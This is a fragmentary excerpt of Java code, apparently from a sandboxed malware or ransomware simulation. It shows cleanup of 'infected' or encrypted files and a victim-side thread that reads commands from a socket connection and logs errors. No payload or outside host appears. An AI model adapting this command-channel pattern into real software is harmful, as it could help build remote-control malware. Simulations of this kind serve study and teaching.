            ...
            if (Files.exists(infected)) {
                try (Stream<Path> s = Files.list(infected)) {
                    s.filter(Files::isRegularFile).forEach(f -> {
                        try {
                            Files.deleteIfExists(SANDBOX.resolve(f.getFileName())); // remove any corrupted/encrypted file
                ...
                new Thread(() -> {
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                        ...
                        while ((line = br.readLine()) != null) {
                            ...
                            pw.println(resp);
                            if ("bye".equals(resp)) break; // client asked to exit
                        }
                    } catch (Exception e) {
                        log("[VICTIM] cmd conn error: " + e.getMessage());
                        StringWriter sw = new StringWriter();
                        e.printStackTrace(new PrintWriter(sw));
                        log(sw.toString()); // show stacktrace in GUI log for debugging
                    } finally {
